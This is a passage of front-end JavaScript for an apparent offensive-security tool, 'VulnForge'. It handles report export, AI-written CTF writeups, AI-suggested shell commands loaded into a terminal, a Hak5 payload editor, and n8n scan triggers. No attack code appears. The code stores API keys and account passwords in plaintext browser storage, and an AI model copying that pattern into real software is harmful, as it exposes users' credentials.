    .footer { color: #6e7681; }
    @page { margin: 15mm; }
  }
</style>
</head>
<body>
  <div class="header">
    <h1>${title}</h1>
    <div class="meta">${date} · VulnForge</div>
  </div>
  ${bodyHtml}
  <div class="footer">
    Generated by <strong>VulnForge</strong> — ${date}
  </div>
</body>
</html>`;
    }

    /**
     * Open a print-friendly popup window for PDF export.
     * User chooses "Save as PDF" in the print dialog.
     */
    function openPDFPreview(htmlContent, title) {
        const win = window.open('', '_blank', 'width=900,height=700,scrollbars=yes');
        if (!win) {
            showToast('⚠️ Popup blocked — allow popups for PDF export');
            return;
        }
        win.document.write(htmlContent);
        win.document.title = title;
        win.document.close();
        win.focus();
        // Wait for fonts/images then print
        setTimeout(() => {
            win.print();
        }, 500);
    }

    /**
     * Generic file download using Blob.
     */
    function downloadString(content, filename, mimeType) {
        const blob = new Blob([content], { type: mimeType + ';charset=utf-8' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        a.click();
        URL.revokeObjectURL(url);
    }

    /**
     * Export a raw report string as MD / HTML / PDF.
     * @param {string} content   - Raw markdown-like text
     * @param {string} filename  - Base filename (no extension)
     * @param {string} format    - 'md' | 'html' | 'pdf'
     * @param {string} title     - Pretty title for the report
     * @param {string} type      - 'bounty' | 'writeup' | 'scan'
     */
    function exportReport(content, filename, format, title, type) {
        const date = new Date().toISOString().split('T')[0];
        const safeName = filename.replace(/[^a-zA-Z0-9_-]/g, '_') || 'report';

        switch (format) {
            case 'md':
                downloadString(content, `${safeName}-${date}.md`, 'text/markdown');
                break;
            case 'html': {
                const html = buildExportHTML(content, title, type);
                downloadString(html, `${safeName}-${date}.html`, 'text/html');
                break;
            }
            case 'pdf':
            case 'client-pdf': {
                const html = buildExportHTML(content, title, type);
                openPDFPreview(html, `${title} — ${date}`);
                break;
            }
            case 'pdf-server':
            case 'server-pdf': {
                // Try server-side PDF generation
                if (DataService && DataService.available) {
                    showToast('⚙ Generating PDF on server...');
                    DataService.generatePdf(content, title).then(blob => {
                        if (blob) {
                            DataService.downloadBlob(blob, `${safeName}-${date}.pdf`);
                            showToast('⬇ Server PDF generated');
                        } else {
                            showToast('⚠️ Server PDF failed, using client-side');
                            const html = buildExportHTML(content, title, type);
                            openPDFPreview(html, `${title} — ${date}`);
                        }
                    });
                } else {
                    // Fallback to client-side
                    showToast('⚠️ DB not available, using client-side PDF');
                    const html = buildExportHTML(content, title, type);
                    openPDFPreview(html, `${title} — ${date}`);
                }
                return; // async, toast handled inside
            }
        }
        showToast(`⬇ ${format.toUpperCase()} exported`);
    }

    // ── Updated Bounty Download ──
    window.downloadBountyReport = function () {
        if (!lastBountyReport) return;
        const target = document.getElementById('bounty-target').value.trim().replace(/[^a-zA-Z0-9]/g, '_') || 'report';
        const format = document.getElementById('bounty-format').value;
        const vulnType = document.getElementById('bounty-type').value;
        exportReport(lastBountyReport, `bug-bounty-${target}`, format, `Bug Bounty — ${vulnType}`, 'bounty');
    };

    // ── Updated AI Writeup Download ──
    window.downloadAIWriteup = function () {
        if (!lastAIWriteup) return;
        const machine = document.getElementById('ai-machine').value.trim().replace(/[^a-zA-Z0-9_-]/g, '_') || 'writeup';
        const format = document.getElementById('ai-format').value;
        exportReport(lastAIWriteup, `writeup-${machine}`, format, `Writeup — ${machine}`, 'writeup');
    };

    // ── Export single scan report ──
    window.exportScanReport = function (index, format) {
        const r = window.reports && window.reports[index];
        if (!r) { showToast('⚠️ Report not found'); return; }

        // Build a text report from the structured data
        let content = `# ${r.type.toUpperCase()} Scan Report\n\n`;
        content += `**Target:** \`${r.target}\`\n`;
        content += `**Date:** ${r.timestamp}\n`;
        content += `**Tool:** ${r.type}\n\n`;
        content += `---\n\n`;

        if (r.type === 'nmap' && r.ports) {
            content += `## Open Ports (${r.ports.length})\n\n`;
            content += `| Port | Protocol | Service | Version |\n`;
            content += `|------|----------|---------|--------|\n`;
            r.ports.forEach(p => {
                content += `| ${p.port} | ${p.protocol || 'tcp'} | ${p.service || '?'} | ${p.version || '-'} |\n`;
            });
            if (r.os) content += `\n**OS:** ${r.os}\n`;
            if (r.raw) content += `\n## Raw Output\n\n\`\`\`\n${r.raw.substring(0, 2000)}\n\`\`\`\n`;
        } else if (r.type === 'gobuster' && r.dirs) {
            content += `## Found Directories (${r.dirs.length})\n\n`;
            r.dirs.forEach(d => {
                content += `- [${d.status}] ${d.path}${d.size ? ` (${d.size})` : ''}\n`;
            });
            if (r.raw) content += `\n## Raw Output\n\n\`\`\`\n${r.raw.substring(0, 2000)}\n\`\`\`\n`;
        } else {
            content += r.raw || 'No data';
        }

        const title = `${r.type.toUpperCase()} — ${r.target}`;
        exportReport(content, `${r.type}-${r.target.replace(/[^a-zA-Z0-9]/g, '_')}`, format, title, 'scan');
    };

    // ── Export all scan reports ──
    window.exportAllReports = function () {
        const arr = window.reports || [];
        if (arr.length === 0) { showToast('⚠️ No reports to export'); return; }
        const format = document.getElementById('reports-format').value;

        // Build a compiled report document
        let content = `# VulnForge — Scan Reports Compilation\n\n`;
        content += `**Date:** ${new Date().toISOString().split('T')[0]}\n`;
        content += `**Total Reports:** ${arr.length}\n\n`;
        content += `---\n\n`;

        arr.forEach((r, i) => {
            content += `## ${i+1}. ${r.type.toUpperCase()} › ${r.target}\n\n`;
            content += `**Time:** ${r.timestamp}\n\n`;

            if (r.type === 'nmap' && r.ports) {
                content += `**Open Ports:** ${r.ports.length}\n\n`;
                r.ports.forEach(p => {
                    content += `- \`${p.port}/${p.protocol || 'tcp'}\` — ${p.service || '?'} ${p.version ? `(${p.version})` : ''}\n`;
                });
                if (r.os) content += `\n**OS Guess:** ${r.os}\n`;
            } else if (r.type === 'gobuster' && r.dirs) {
                content += `**Found:** ${r.dirs.length} directories\n\n`;
                r.dirs.forEach(d => {
                    content += `- [${d.status}] ${d.path}\n`;
                });
            } else {
                content += `\`\`\`\n${(r.raw || 'No data').substring(0, 1000)}\n\`\`\`\n`;
            }
            content += `\n---\n\n`;
        });

        const title = `All Reports — VulnForge`;
        exportReport(content, `all-reports-${new Date().toISOString().split('T')[0]}`, format, title, 'scan');
    };

    // ============================================================
    //  AI WRITEUP GENERATOR
    // ============================================================
    let lastAIWriteup = '';

    // Load saved API config
    function loadAIConfig() {
        try {
            const ep = localStorage.getItem('vulnforge_ai_endpoint');
            const key = localStorage.getItem('vulnforge_ai_key');
            const model = localStorage.getItem('vulnforge_ai_model');
            if (ep) document.getElementById('ai-endpoint').value = ep;
            if (key) document.getElementById('ai-key').value = key;
            if (model) document.getElementById('ai-model').value = model;
            // Also load suggest config
            const sp = localStorage.getItem('vulnforge_suggest_provider');
            const sk = localStorage.getItem('vulnforge_suggest_key');
            const sm = localStorage.getItem('vulnforge_suggest_model');
            if (sp) document.getElementById('suggest-provider').value = sp;
            if (sk) document.getElementById('suggest-key').value = sk;
            if (sm) document.getElementById('suggest-model').value = sm;
        } catch {}
    }

    function saveAIConfig() {
        try {
            localStorage.setItem('vulnforge_ai_endpoint', document.getElementById('ai-endpoint').value);
            localStorage.setItem('vulnforge_ai_key', document.getElementById('ai-key').value);
            localStorage.setItem('vulnforge_ai_model', document.getElementById('ai-model').value);
            // Also save suggest config
            localStorage.setItem('vulnforge_suggest_provider', document.getElementById('suggest-provider').value);
            localStorage.setItem('vulnforge_suggest_key', document.getElementById('suggest-key').value);
            localStorage.setItem('vulnforge_suggest_model', document.getElementById('suggest-model').value);
        } catch {}
    }

    window.generateAIWriteup = async function () {
        const endpoint = document.getElementById('ai-endpoint').value.trim();
        const apiKey   = document.getElementById('ai-key').value.trim();
        const model    = document.getElementById('ai-model').value.trim() || 'gpt-4';
        const machine  = document.getElementById('ai-machine').value.trim();
        const findings = document.getElementById('ai-findings').value.trim();
        const steps    = document.getElementById('ai-steps').value.trim();
        const flags    = document.getElementById('ai-flags').value.trim();

        if (!apiKey) { alert('⚠️  Enter your API key in the configuration section'); return; }
        if (!machine) { alert('⚠️  Enter the machine/target name'); return; }
        if (!findings) { alert('⚠️  Enter at least some findings'); return; }

        saveAIConfig();

        const status = document.getElementById('ai-status');
        const output = document.getElementById('ai-output');
        const btnGen = document.querySelector('#tab-aiwriteup .bg-neon\\/10');
        status.classList.remove('hidden');
        status.innerHTML = '⏳ Generating writeup... <span class="ai-status-dot ml-1"></span>';
        output.textContent = 'Generating...';
        if (btnGen) btnGen.disabled = true;

        const prompt = `You are a professional penetration tester writing a CTF machine writeup. Write a detailed, well-structured writeup in Markdown format.

Machine: ${machine}
${flags ? `Flags: ${flags}` : ''}

## Key Findings
${findings}

## Steps Taken
${steps || 'See findings above'}

Generate a complete writeup with:
1. **Reconnaissance** - Nmap, Gobuster, etc. findings
2. **Enumeration** - Detailed analysis of services found
3. **Exploitation** - Step-by-step with commands and explanations
4. **Privilege Escalation** - How root/admin was obtained
5. **Flags** - user.txt and root.txt
6. **Lessons Learned** - Key takeaways

Use markdown formatting with code blocks for commands. Be thorough and technical.`;

        try {
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${apiKey}`
                },
                body: JSON.stringify({
                    model: model,
                    messages: [
                        { role: 'system', content: 'You are a professional CTF writeup author. Write detailed, technical Markdown writeups.' },
                        { role: 'user', content: prompt }
                    ],
                    temperature: 0.7,
                    max_tokens: 4000
                })
            });

            if (!response.ok) {
                const errText = await response.text();
                throw new Error(`API error ${response.status}: ${errText}`);
            }

            const data = await response.json();
            let content = '';
            if (data.choices && data.choices[0] && data.choices[0].message) {
                content = data.choices[0].message.content;
            } else if (data.response) {
                content = data.response;
            } else {
                content = JSON.stringify(data, null, 2);
            }

            lastAIWriteup = content;
            output.textContent = content;
            document.getElementById('btn-download-ai').disabled = false;
            showToast('🤖 Writeup generated successfully');
        } catch (err) {
            output.textContent = `[!] Error: ${err.message}`;
            showToast(`⚠️ AI generation failed: ${err.message}`);
        } finally {
            status.classList.add('hidden');
            if (btnGen) btnGen.disabled = false;
        }
    };

    // ============================================================
    //  AI SUGGEST NEXT STEP (Fase 2)
    // ============================================================

    let suggestionHistory = [];

    window.loadAIConfigToSuggest = function () {
        const ep = document.getElementById('ai-endpoint').value;
        const key = document.getElementById('ai-key').value;
        const model = document.getElementById('ai-model').value;
        // Detect provider from endpoint URL
        let provider = 'openai';
        if (ep.includes('gemini') || ep.includes('generativelanguage')) provider = 'gemini';
        else if (ep.includes('anthropic') || ep.includes('claude')) provider = 'anthropic';
        else if (ep.includes('openrouter')) provider = 'openrouter';
        else if (ep.includes('deepseek')) provider = 'deepseek';
        else if (ep.includes('groq')) provider = 'groq';
        document.getElementById('suggest-provider').value = provider;
        document.getElementById('suggest-key').value = key;
        // Set a sensible default model if none saved
        const defaults = {
            openai: 'gpt-4o-mini', gemini: 'gemini-2.0-flash',
            anthropic: 'claude-3-haiku-20240307', openrouter: 'gpt-4o-mini',
            deepseek: 'deepseek-chat', groq: 'llama-3.3-70b-versatile'
        };
        document.getElementById('suggest-model').value = model || defaults[provider] || 'gpt-4o-mini';
        showToast('📋 Config loaded from AI Writeup');
    };

    window.collectFindingsText = function () {
        // Collect findings from the reports data structure
        // Each report has: type, title, target, raw_output, parsed_data
        const reports = window.reports || [];
        if (reports.length === 0) {
            // Fallback: try to get from the DOM
            const cards = document.querySelectorAll('#findings-list .finding-card');
            return Array.from(cards).map(c => c.textContent.trim()).filter(Boolean).join('\n---\n');
        }
        return reports.map(r => {
            const lines = [`[${r.type.toUpperCase()}] ${r.title || ''}`];
            if (r.target) lines.push(`  Target: ${r.target}`);
            // Parse raw_output for key lines
            if (r.raw_output) {
                const keyLines = r.raw_output.split('\n').filter(l => {
                    const t = l.trim();
                    return t && (t.includes('open') || t.includes('found') || t.includes('Status:') ||
                           t.includes('->') || t.includes('flag') || t.includes('user:') ||
                           t.includes('root:') || t.toLowerCase().includes('vulnerable'));
                }).slice(0, 10).map(l => `  ${l.trim()}`);
                if (keyLines.length) lines.push(...keyLines);
            }
            if (r.parsed_data && Object.keys(r.parsed_data).length) {
                try { lines.push(`  Data: ${JSON.stringify(r.parsed_data).slice(0, 200)}`); } catch {}
            }
            return lines.join('\n');
        }).join('\n---\n');
    };

    // ── Extract command from AI suggestion ──
    window.extractCommandFromSuggestion = function (text) {
        if (!text) return '';
        // Priority 1: text in backticks that looks like a shell command
        const backtickCmds = text.match(/`([^`]+)`/g);
        if (backtickCmds) {
            // Prefer first backtick cmd that looks shell-ish (has spaces, starts with tool name)
            for (const m of backtickCmds) {
                const cmd = m.slice(1, -1).trim();
                if (/^[a-z][\w-]+\s/.test(cmd) && cmd.length < 200) return cmd;
            }
            // Fallback: first backtick item
            const first = backtickCmds[0].slice(1, -1).trim();
            if (first && first.length < 200) return first;
        }
        // Priority 2: lines starting with "Run " or "Use " or "$ " or "# "
        for (const line of text.split('\n')) {
            const trimmed = line.trim();
            // "Run `command`" -> extract the backtick part
            const runMatch = trimmed.match(/^Run\s+`([^`]+)`/i);
            if (runMatch) return runMatch[1].trim();
            // "$ command" or "# command"
            const shellMatch = trimmed.match(/^[$#]\s+(.+)/);
            if (shellMatch) return shellMatch[1].trim();
            // "Use `command`"
            const useMatch = trimmed.match(/^Use\s+`([^`]+)`/i);
            if (useMatch) return useMatch[1].trim();
        }
        // Priority 3: first line, stripped of markdown bold/italic
        const firstLine = text.split('\n')[0].replace(/[*_`#]/g, '').trim();
        if (firstLine && firstLine.length < 100) return firstLine;
        return '';
    };

    window.suggestNextStep = async function () {
        const provider = document.getElementById('suggest-provider').value;
        const apiKey = document.getElementById('suggest-key').value.trim();
        const modelEl = document.getElementById('suggest-model');
        let model = modelEl.value.trim();
        // Validate model — if it looks like a provider name, fix it
        const providerNames = ['openai','gemini','anthropic','openrouter','deepseek','groq'];
        if (!model || providerNames.includes(model.toLowerCase())) {
            model = MODEL_DEFAULTS[provider] || 'gpt-4o-mini';
            if (modelEl) modelEl.value = model;
        }
        const target = document.getElementById('target-ip').value.trim() || 'unknown';
        const findings = collectFindingsText();
        const btn = document.getElementById('btn-suggest');
        const status = document.getElementById('suggest-status');
        const section = document.getElementById('suggestions-section');
        const list = document.getElementById('suggestions-list');

        if (!apiKey) {
            showToast('⚠️ Enter an API key or load from AI Writeup config');
            return;
        }

        btn.disabled = true;
        btn.textContent = `⏳ ${provider}...`;
        status.textContent = `⏳ Consulting ${provider} (${model || 'default model'})...`;
        status.classList.remove('hidden');

        try {
            const resp = await fetch('/api/suggest', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    provider,
                    api_key: apiKey,
                    model: model || '',
                    target,
                    findings: findings || 'No findings yet. Suggest initial recon.',
                    history: suggestionHistory.slice(-6) // last 6 exchanges for context
                })
            });

            const data = await resp.json();
            if (!data.ok) throw new Error(data.error || 'Unknown error');

            const suggestion = data.suggestion;

            // Add to history
            suggestionHistory.push({ role: 'assistant', content: suggestion });

            // Add to DOM
            section.classList.remove('hidden');
            const card = document.createElement('div');
            card.className = 'bg-void border border-cyber/20 rounded p-2.5 text-[11px]';
            card.innerHTML = `
                <div class="flex items-center gap-1.5 mb-1.5">
                    <span class="text-[9px] text-cyber/60 font-mono">${new Date().toLocaleTimeString()}</span>
                    <span class="text-[9px] text-gray-700">·</span>
                    <span class="text-[9px] text-gray-700 uppercase">${provider}</span>
                </div>
                <div class="text-gray-300 leading-relaxed text-[11px] suggestion-body">${mdToHTML(suggestion)}</div>
                <div class="flex gap-2 mt-1.5">
                    <button data-cmd="${extractCommandFromSuggestion(suggestion).replace(/"/g, '&quot;')}"
                        class="suggest-run-cmd text-[9px] text-neon/60 hover:text-neon transition-all">▶ Run first command</button>
                    <button onclick="copyToClipboard(this)"
                        class="text-[9px] text-gray-600 hover:text-gray-400 transition-all">📋 Copy</button>
                </div>
            `;
            list.appendChild(card);
            list.scrollTop = list.scrollHeight;

            // Auto-load first suggested command into terminal & switch there
            const firstCmd = extractCommandFromSuggestion(suggestion);
            const input = document.getElementById('cmd-input');
            if (input && firstCmd) {
                input.value = firstCmd;
                switchTab('terminal');
                input.focus();
                showToast('▶ Command loaded — press Enter to run in Terminal');
            } else {
                switchTab('findings');
                showToast('🤖 Suggestion received — check Findings tab');
            }
        } catch (err) {
            showToast(`⚠️ ${err.message}`);
            const card = document.createElement('div');
            card.className = 'bg-void border border-blood/20 rounded p-2.5 text-[11px] text-blood';
            card.textContent = `[!] ${err.message}`;
            list.appendChild(card);
        } finally {
            btn.disabled = false;
            btn.textContent = '🔍 Sugerir siguiente paso';
            status.classList.add('hidden');
        }
    };

    window.clearSuggestions = function () {
        suggestionHistory = [];
        document.getElementById('suggestions-list').innerHTML = '';
        document.getElementById('suggestions-section').classList.add('hidden');
    };

    // Delegated click handler for "Run first command" buttons in suggestions
    document.addEventListener('click', function (e) {
        const btn = e.target.closest('.suggest-run-cmd');
        if (btn) {
            const cmd = btn.getAttribute('data-cmd') || '';
            const input = document.getElementById('cmd-input');
            if (input && cmd) {
                input.value = cmd;
                input.focus();
                showToast('📋 Command loaded in terminal: ' + cmd.slice(0, 60));
            }
        }
    });

    window.copyToClipboard = function (btn) {
        const text = btn.closest('.bg-void')?.querySelector('.text-gray-300')?.textContent || '';
        if (text && navigator.clipboard) {
            navigator.clipboard.writeText(text).then(() => {
                showToast('📋 Copied to clipboard');
            }).catch(() => {});
        }
    };

    // ============================================================
    //  HAK5 PAYLOAD EDITOR
    // ============================================================
    const hak5Devices = {
        bunny:  { name: 'Bash Bunny',      icon: '🐰', ext: 'txt', lang: 'ducky script', desc: 'USB Rubber Ducky-style HID attacks' },
        omg:    { name: 'OMG Cable',       icon: '🔌', ext: 'js',  lang: 'javascript',    desc: 'WiFi-enabled drop cable payloads' },
        m5:     { name: 'M5 Stack',        icon: '📟', ext: 'py',  lang: 'micropython',   desc: 'ESP32-based multi-tool payloads' },
        shack:  { name: 'Shack Jack',      icon: '🦈', ext: 'txt', lang: 'bash',          desc: 'Ethernet remote access payloads' }
    };
    let currentHak5Device = 'bunny';

    function getHak5StorageKey() {
        return `vulnforge_hak5_${currentHak5Device}`;
    }

    function getHak5Payloads() {
        try {
            return JSON.parse(localStorage.getItem(getHak5StorageKey()) || '[]');
        } catch { return []; }
    }

    function setHak5Payloads(arr) {
        localStorage.setItem(getHak5StorageKey(), JSON.stringify(arr));
        updateHak5SavedCount();
    }

    function updateHak5SavedCount() {
        const count = getHak5Payloads().length;
        document.getElementById('hak5-saved-count').textContent = count;
    }

    window.switchHak5Device = function (deviceId) {
        currentHak5Device = deviceId;
        const dev = hak5Devices[deviceId];
        if (!dev) return;

        // Update tabs
        document.querySelectorAll('.hak5-device-btn').forEach(b => b.classList.remove('active'));
        document.querySelector(`.hak5-device-btn[data-device="${deviceId}"]`)?.classList.add('active');

        // Update UI
        document.getElementById('hak5-device-name').textContent = dev.name;
        document.getElementById('hak5-device-icon').textContent = dev.icon;
        document.getElementById('hak5-device-desc').textContent = dev.desc;
        document.getElementById('hak5-lang').textContent = dev.lang;
        document.getElementById('hak5-editor').value = '';
        document.getElementById('hak5-payload-name').value = '';
        document.getElementById('hak5-payload-status').textContent = '';
        updateHak5SavedCount();
        showToast(`🔌 Switched to ${dev.name}`);
    };

    window.saveHak5Payload = function () {
        const dev = hak5Devices[currentHak5Device];
        const name = document.getElementById('hak5-payload-name').value.trim();
        const code = document.getElementById('hak5-editor').value.trim();
        if (!name) { showToast('⚠️ Enter a payload name'); return; }
        if (!code) { showToast('⚠️ Enter payload code'); return; }

        const payloads = getHak5Payloads();
        const filename = name.endsWith(`.${dev.ext}`) ? name : `${name}.${dev.ext}`;

        // Update if exists, else add
        const idx = payloads.findIndex(p => p.name === filename);
        if (idx >= 0) {
            payloads[idx].code = code;
            payloads[idx].updated = new Date().toISOString();
            showToast(`💾 Updated "${filename}"`);
        } else {
            payloads.push({ name: filename, code, device: currentHak5Device, created: new Date().toISOString(), updated: new Date().toISOString() });
            showToast(`💾 Saved "${filename}"`);
        }
        setHak5Payloads(payloads);
    };

    window.loadHak5Payload = function () {
        const payloads = getHak5Payloads();
        if (payloads.length === 0) { showToast('📂 No saved payloads'); return; }

        // Build a simple select prompt
        const names = payloads.map((p, i) => `${i+1}. ${p.name}`).join('\n');
        const input = prompt(`Saved payloads for ${hak5Devices[currentHak5Device].name}:\n\n${names}\n\nEnter number to load:`);
        if (!input) return;
        const idx = parseInt(input) - 1;
        if (idx < 0 || idx >= payloads.length) { showToast('⚠️ Invalid selection'); return; }

        document.getElementById('hak5-editor').value = payloads[idx].code;
        document.getElementById('hak5-payload-name').value = payloads[idx].name;
        document.getElementById('hak5-payload-status').textContent = `📂 loaded "${payloads[idx].name}"`;
        showToast(`📂 Loaded "${payloads[idx].name}"`);
    };

    window.listHak5Payloads = function () {
        const payloads = getHak5Payloads();
        if (payloads.length === 0) {
            showToast('📋 No saved payloads for this device');
            return;
        }
        // Show in terminal-like output in status
        const list = payloads.map((p, i) => `${i+1}. ${p.name}`).join(' · ');
        document.getElementById('hak5-payload-status').textContent = `📋 ${payloads.length} payloads: ${list}`;
        showToast(`📋 ${payloads.length} payloads for ${hak5Devices[currentHak5Device].name}`);
    };

    window.clearHak5Editor = function () {
        document.getElementById('hak5-editor').value = '';
        document.getElementById('hak5-payload-name').value = '';
        document.getElementById('hak5-payload-status').textContent = '✕ cleared';
        showToast('✕ Editor cleared');
    };

    // Update line count on edit (deferred until DOM ready)
    const initHak5 = () => {
        const hak5Editor = document.getElementById('hak5-editor');
        if (hak5Editor) {
            hak5Editor.addEventListener('input', () => {
                document.getElementById('hak5-line-count').textContent = getLineCount(hak5Editor.value);
            });
        }
        updateHak5SavedCount();
    };
    // Run now (DOM is already loaded at this point since we're inside DOMContentLoaded)
    initHak5();

    // ============================================================
    //  PAYLOAD STUDIO CONNECTION
    // ============================================================
    function getPSCreds() {
        try { return JSON.parse(localStorage.getItem('vulnforge_ps_creds') || 'null'); } catch { return null; }
    }

    function setPSCreds(creds) {
        localStorage.setItem('vulnforge_ps_creds', JSON.stringify(creds));
    }

    function clearPSCreds() {
        localStorage.removeItem('vulnforge_ps_creds');
    }

    function updatePSStatus(connected) {
        const badge = document.getElementById('ps-status-badge');
        const form  = document.getElementById('ps-connect-form');
        const btnDisconnect = document.getElementById('btn-disconnect-ps');
        if (!badge) return;

        if (connected) {
            badge.innerHTML = '🟢 connected';
            badge.className = 'text-[9px] text-neon border border-neon/30 rounded px-2 py-0.5';
            if (form) form.style.display = 'none';
            if (btnDisconnect) btnDisconnect.style.display = 'inline-block';
        } else {
            badge.innerHTML = '⚪ disconnected';
            badge.className = 'text-[9px] text-gray-700 border border-gray-800 rounded px-2 py-0.5';
            if (btnDisconnect) btnDisconnect.style.display = 'none';
        }
    }

    window.togglePSCreds = function () {
        const form = document.getElementById('ps-connect-form');
        if (!form) return;
        const hidden = form.style.display === 'none';
        form.style.display = hidden ? 'block' : 'none';
        // Pre-fill if saved
        if (hidden) {
            const saved = getPSCreds();
            if (saved) {
                document.getElementById('ps-email').value = saved.email || '';
                document.getElementById('ps-password').value = saved.password || '';
            }
        }
    };

    window.disconnectPayloadStudio = function () {
        clearPSCreds();
        updatePSStatus(false);
        document.getElementById('ps-email').value = '';
        document.getElementById('ps-password').value = '';
        document.getElementById('ps-connect-form').style.display = 'none';
        showToast('⚡ Credentials cleared');
    };

    window.doPayloadStudioLogin = function () {
        const email = document.getElementById('ps-email').value.trim();
        const password = document.getElementById('ps-password').value.trim();
        if (!email || !password) {
            showToast('⚠️ Enter email and password');
            return;
        }
        setPSCreds({ email, password, savedAt: new Date().toISOString() });
        updatePSStatus(true);
        document.getElementById('ps-connect-form').style.display = 'none';
        showToast('🔌 Credentials saved — click Launch Payload Studio to open');
    };

    // Restore saved session on load
    function restorePSSession() {
        const saved = getPSCreds();
        if (saved) {
            document.getElementById('ps-email').value = saved.email || '';
            document.getElementById('ps-password').value = saved.password || '';
            updatePSStatus(true);
        }
    }
    restorePSSession();

    // ── Auto-save Suggest + AI config on input change ──
    const MODEL_DEFAULTS = {
        openai: 'gpt-4o-mini', gemini: 'gemini-2.0-flash',
        anthropic: 'claude-3-haiku-20240307', openrouter: 'gpt-4o-mini',
        deepseek: 'deepseek-chat', groq: 'llama-3.3-70b-versatile'
    };

    function initAutosave() {
        ['suggest-provider','suggest-key','suggest-model','ai-endpoint','ai-key','ai-model'].forEach(id => {
            const el = document.getElementById(id);
            if (el) el.addEventListener('blur', saveAIConfig);
        });
        // Auto-fill model when provider changes (always)
        const provEl = document.getElementById('suggest-provider');
        if (provEl) {
            provEl.addEventListener('change', function () {
                const modelEl = document.getElementById('suggest-model');
                if (modelEl) modelEl.value = MODEL_DEFAULTS[this.value] || 'gpt-4o-mini';
                saveAIConfig();
            });
        }
    }
    initAutosave();

    // ============================================================
    //  N8N AUTOMATION
    // ============================================================

    // ── Load saved n8n URL ──
    function loadN8nUrl() {
        const saved = localStorage.getItem('vulnforge_n8n_url');
        const input = document.getElementById('n8n-url');
        if (saved && input) {
            input.value = saved;
        }
    }

    function saveN8nUrl() {
        const input = document.getElementById('n8n-url');
        if (input && input.value.trim()) {
            localStorage.setItem('vulnforge_n8n_url', input.value.trim());
        }
    }

    window.checkN8nStatus = async function () {
        const input = document.getElementById('n8n-url');
        const badge = document.getElementById('n8n-status-badge');
        const btn   = document.getElementById('btn-n8n-health');
        if (!input || !badge) return;

        const url = input.value.trim();
        if (!url) {
            badge.innerHTML = '⚠️ enter URL';
            badge.className = 'text-[9px] text-blood border border-blood/30 rounded px-2 py-1';
            return;
        }

        saveN8nUrl();
        btn.textContent = '⏳ Testing...';
        btn.disabled = true;
        badge.innerHTML = '⏳ testing...';
        badge.className = 'text-[9px] text-cyber border border-cyber/30 rounded px-2 py-1';

        try {
            const resp = await fetch((window.API_URL || '') + `/api/n8n/status?n8n_url=${encodeURIComponent(url)}`);
            const data = await resp.json();
            if (data.reachable) {
                badge.innerHTML = '🟢 reachable';
                badge.className = 'text-[9px] text-neon border border-neon/30 rounded px-2 py-1';
                showToast('✅ n8n server is reachable');
            } else {
                badge.innerHTML = '🔴 unreachable';
                badge.className = 'text-[9px] text-blood border border-blood/30 rounded px-2 py-1';
                showToast('❌ n8n server is not responding');
            }
        } catch (err) {
            badge.innerHTML = '⚠️ error';
            badge.className = 'text-[9px] text-blood border border-blood/30 rounded px-2 py-1';
            showToast(`⚠️ Connection test failed: ${err.message}`);
        } finally {
            btn.textContent = '🔍 Test';
            btn.disabled = false;
        }
    };

    window.triggerN8nScan = async function () {
        const urlInput   = document.getElementById('n8n-url');
        const targetInput = document.getElementById('n8n-target');
        const scanSelect = document.getElementById('n8n-scan-type');
        const btn        = document.getElementById('btn-n8n-trigger');
        const statusSpan = document.getElementById('n8n-scan-status');
        const logDiv     = document.getElementById('n8n-log');

        if (!urlInput || !targetInput || !scanSelect || !logDiv) return;

        const n8nUrl   = urlInput.value.trim();
        const target   = targetInput.value.trim();
        const scanType = scanSelect.value;

        if (!n8nUrl) {
            showToast('⚠️ Enter your n8n server URL first');
            return;
        }
        if (!target) {
            showToast('⚠️ Enter a target domain or IP');
            return;
        }

        saveN8nUrl();
        btn.disabled = true;
        btn.textContent = '⏳ Scanning...';
        statusSpan.textContent = '⏳ triggering workflow...';

        appendN8nLog(`[•] Triggering Attack Surface Scan on ${target} (${scanType})`);
        appendN8nLog(`[•] n8n URL: ${n8nUrl}`);

        try {
            const resp = await fetch((window.API_URL || '') + '/api/n8n/trigger', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    target: target,
                    scan_type: scanType,
                    n8n_url: n8nUrl
                })
            });
            const data = await resp.json();

            if (data.ok) {
                appendN8nLog(`[✓] Workflow triggered successfully (HTTP ${data.status})`);
                if (data.data) {
                    // Try to format as JSON if possible
                    try {
                        const parsed = JSON.parse(data.data);
                        appendN8nLog(`[=] Response: ${JSON.stringify(parsed, null, 2)}`);
                    } catch {
                        appendN8nLog(`[=] Response: ${data.data.substring(0, 500)}`);
                    }
                }
                statusSpan.textContent = '✅ Scan triggered';
                showToast(`✅ Attack Surface Scan triggered for ${target}`);
            } else {
                appendN8nLog(`[✗] Workflow failed (HTTP ${data.status}): ${data.error || 'unknown error'}`);
                statusSpan.textContent = '❌ Failed';
                showToast(`❌ Workflow trigger failed: ${data.error || 'unknown error'}`);
            }
        } catch (err) {
            appendN8nLog(`[✗] Error: ${err.message}`);
            statusSpan.textContent = '⚠️ Error';
            showToast(`⚠️ Trigger error: ${err.message}`);
        } finally {
            btn.disabled = false;
            btn.textContent = '▶ Trigger Scan';
        }
    };

    function appendN8nLog(msg) {
        const logDiv = document.getElementById('n8n-log');
        if (!logDiv) return;
        // Remove the placeholder text if still there
        if (logDiv.textContent.includes('No scans triggered yet')) {
            logDiv.textContent = '';
        }
        const line = document.createElement('div');
        line.textContent = msg;
        line.className = 'text-gray-400';
        logDiv.appendChild(line);
        logDiv.scrollTop = logDiv.scrollHeight;
    }

    window.clearN8nLog = function () {
        const logDiv = document.getElementById('n8n-log');
        if (logDiv) {
            logDiv.textContent = '';
            const placeholder = document.createElement('span');
            placeholder.className = 'text-gray-700';
            placeholder.textContent = '[—] Log cleared.';
            logDiv.appendChild(placeholder);
        }
        document.getElementById('n8n-scan-status').textContent = '';
        showToast('✕ Log cleared');
    };

    // ── Init n8n ──
    loadN8nUrl();

    // ============================================================
    //  TOAST NOTIFICATIONS
    // ============================================================
    function showToast(msg) {
        const existing = document.querySelector('.toast');
        if (existing) existing.remove();
        const toast = document.createElement('div');
        toast.className = 'toast';
        toast.textContent = msg;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
    }

    // ============================================================
    //  THEME TOGGLE (Monochrome Mode)
